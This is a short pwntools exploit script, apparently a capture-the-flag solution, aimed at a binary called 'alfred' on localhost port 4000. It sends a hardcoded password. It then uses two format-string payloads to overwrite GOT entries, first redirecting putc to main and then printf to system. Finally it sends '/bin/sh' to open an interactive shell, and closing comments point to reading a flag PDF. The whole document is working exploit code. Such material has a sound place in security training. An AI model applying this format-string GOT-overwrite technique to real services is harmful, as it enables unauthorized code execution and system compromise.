from pwn import *

elf = ELF('./alfred')
p = remote('localhost', 4000)

passwd = b"Alma_and_Pat"

p.sendlineafter(b'>>> ', passwd)

payload1 = fmtstr_payload(7, {elf.got['putc']: elf.symbols['main']})
p.sendlineafter(b'>>> ', payload1)

p.sendlineafter(b'>>> ', passwd)

payload2 = fmtstr_payload(7, {elf.got['printf']: elf.plt['system']})
p.sendlineafter(b'>>> ', payload2)

p.sendlineafter(b'unlock:\n', passwd)
p.sendlineafter(b'[Alfred]?:\n', b'/bin/sh')

p.interactive()
# read script_flag.pdf
# copy locally
# open via pdf viewer